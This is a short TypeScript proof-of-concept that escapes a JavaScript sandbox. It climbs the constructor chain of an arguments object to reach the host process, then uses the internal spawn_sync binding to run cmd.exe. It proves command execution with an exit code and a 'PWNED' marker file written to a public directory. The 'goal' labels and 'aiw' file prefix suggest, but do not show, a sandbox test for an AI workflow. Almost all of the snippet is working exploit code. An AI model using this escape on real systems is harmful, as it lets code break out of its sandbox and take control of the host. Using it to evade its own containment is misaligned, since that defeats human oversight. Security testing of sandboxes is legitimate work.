// goal-poc2c: with host process in hand (goal-poc2b), the legacy internal binding
// route to code execution: process.binding('spawn_sync').spawn(...) — bypasses the
// module system entirely (no mainModule/require/import needed). Exec proof: cmd
// exits 42 on demand and writes a marker file into the scratch dir.
const F: any = (args as any).constructor.constructor;
let r = 'no';
try {
  const proc: any = F('return process')();
  const spawnSyncB: any = F('return process.binding("spawn_sync")')();
  const comspec: string = (proc.env && proc.env.ComSpec) || 'cmd.exe';
  const ret42: any = spawnSyncB.spawn({ file: comspec, args: ['/d','/s','/c','exit 42'], stdio: [ {type:'pipe',readable:true,writable:false},{type:'pipe',readable:false,writable:true},{type:'pipe',readable:false,writable:true} ] });
  const retFile: any = spawnSyncB.spawn({ file: comspec, args: ['/d','/s','/c','echo PWNED-SPAWNSYNC-ESCAPE> C:/Users/Public/aiw-poc2c-proof.txt'], stdio: [ {type:'pipe',readable:true,writable:false},{type:'pipe',readable:false,writable:true},{type:'pipe',readable:false,writable:true} ] });
  r = 'EXIT42:' + ret42.status + ':FILEWRITE-STATUS:' + retFile.status;
} catch (e) {
  r = 'blocked:' + (e as Error).name + ':' + String((e as Error).message ?? '').slice(0,140);
}
log('POC2C-SPAWNSYNC:' + r);
return { spawnSync: r };
